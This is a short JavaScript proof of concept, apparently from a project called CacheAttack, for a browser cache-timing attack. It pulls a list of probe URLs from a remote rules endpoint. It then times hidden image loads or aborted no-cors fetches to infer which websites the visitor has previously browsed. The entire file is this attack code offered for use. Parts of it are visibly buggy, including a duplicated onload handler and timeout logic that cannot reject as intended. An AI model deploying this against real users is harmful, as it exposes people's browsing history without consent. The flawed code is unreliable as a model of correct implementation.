// NDev 2019 https://github.com/NDevTK/CacheAttack
const max = 10;

async function getRules() {
let req = await fetch("https://cache.ndev.tk/rules")
let body = await req.json();
return new Map(body);
}

async function getWebsites() {
    Websites = await getRules();
    result = [];
    // Foreach website check if cached
    var callback = (navigator.userAgent.includes("Firefox")) ? ifCached_1 : ifCached_2;
    for (let website of Websites) {
        await callback(website[0]).then(_ => result.push(website[1])).catch(_ => {});
    }
    return result;
};

async function ifCached_1(url, retry) {
    return new Promise((resolve, reject) => {
        let img = new Image(0, 0);
        img.hidden = true;
        img.onload = _ => {return resolve();}
        img.onload = _ => {return resolve();}
        img.src = url;
        setTimeout(_ => {
            img.src = ""
            img.remove();
            if (retry) {
                reject("Timeout");
                return
            }
            return ifCached_1(url, true);
        }, max);
    });
}

async function ifCached_2(url){
  var controller = new AbortController();
  var signal = controller.signal;
  let timeout = await setTimeout(_ => { // Stop request after max
    controller.abort();
    throw "Timeout";
  }, max);
  await fetch(url, {mode: "no-cors", signal});
  clearTimeout(timeout);
  return;
}
